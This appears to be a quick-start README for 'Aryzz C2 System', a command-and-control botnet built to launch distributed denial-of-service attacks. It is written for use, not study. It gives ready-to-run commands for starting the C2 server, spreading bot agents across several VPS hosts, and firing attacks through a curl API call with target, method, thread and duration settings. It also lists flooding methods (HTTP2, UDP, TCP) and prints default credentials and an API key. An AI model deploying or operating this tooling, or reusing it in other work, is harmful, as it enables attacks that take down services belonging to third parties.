# 🎯 Aryzz C2 System - Quick Start

## 🚀 Quick Start

### Method 1: Using Script (Recommended)

```bash
# Make script executable
chmod +x start-c2.sh

# Run script
./start-c2.sh
```

### Method 2: Manual Commands

**Start C2 Server:**
```bash
npm run c2-server
# or
node index.js c2-server -p 8080
```

**Start C2 Agent:**
```bash
npm run c2-agent
# or
node index.js c2-agent --c2-url http://localhost:8080
```

## 📊 Access Dashboard

Open browser: `http://localhost:8080/dashboard`

Default credentials:
- Username: `admin`
- Password: `admin123`

## 🎮 Control Panel Features

### 1. View Connected Bots
- Real-time bot status
- System information
- Last seen timestamp

### 2. Launch Attacks
- Select target
- Choose method (GET, POST, HTTP2, UDP, TCP, etc.)
- Configure threads, duration, RPC
- Distribute across all bots

### 3. Monitor Statistics
- Total bots (online/offline)
- Running attacks
- Total requests sent
- Success/failure rates

## 📡 API Usage

### Start Attack via API

```bash
curl -X POST http://localhost:8080/api/attack/start \
  -H "X-API-Key: aryzz-c2-api-key-2024" \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://target.com",
    "method": "GET",
    "threads": 500,
    "duration": 120,
    "rpc": 10
  }'
```

### List Bots

```bash
curl http://localhost:8080/api/bots \
  -H "X-API-Key: aryzz-c2-api-key-2024"
```

### Get Statistics

```bash
curl http://localhost:8080/api/stats/overview \
  -H "X-API-Key: aryzz-c2-api-key-2024"
```

## 🌐 Deploy to Production

### C2 Server (VPS)

```bash
# Install PM2
npm install -g pm2

# Start C2 server
pm2 start index.js --name c2-server -- c2-server -p 8080

# Save PM2 config
pm2 save
pm2 startup
```

### Bot Agents (Multiple VPS)

Deploy on each VPS:

```bash
# Clone repo
git clone https://github.com/AryzXploit/BOT-TELE-DOS.git
cd BOT-TELE-DOS
npm install

# Start agent
pm2 start index.js --name c2-agent -- c2-agent --c2-url http://your-c2-server:8080

# Save config
pm2 save
```

## 🔧 Configuration

Edit `config.json`:

```json
{
  "c2": {
    "server": {
      "port": 8080,
      "host": "0.0.0.0",
      "apiKey": "your-secret-api-key"
    }
  }
}
```

## 📚 Full Documentation

See [C2-GUIDE.md](./C2-GUIDE.md) for complete documentation.

## 🎯 Architecture

```
┌─────────────────┐
│   C2 Server     │
│  (Port 8080)    │
│                 │
│  - REST API     │
│  - WebSocket    │
│  - Dashboard    │
│  - Database     │
└────────┬────────┘
         │
    ┌────┴────┐
    │         │
┌───▼───┐ ┌──▼────┐
│ Bot 1 │ │ Bot 2 │  ... Bot N
│Agent  │ │Agent  │
└───────┘ └───────┘
```

## 🔥 Features

- ✅ Multi-bot orchestration
- ✅ Real-time monitoring
- ✅ Distributed attacks
- ✅ Task queue management
- ✅ WebSocket communication
- ✅ REST API
- ✅ Modern web dashboard
- ✅ SQLite persistence
- ✅ Auto-reconnect
- ✅ Heartbeat monitoring

## 📞 Support

- GitHub: https://github.com/AryzXploit
- Telegram: @AryzzXploit

---

**Developed by Aryzz-Dev** 🔥
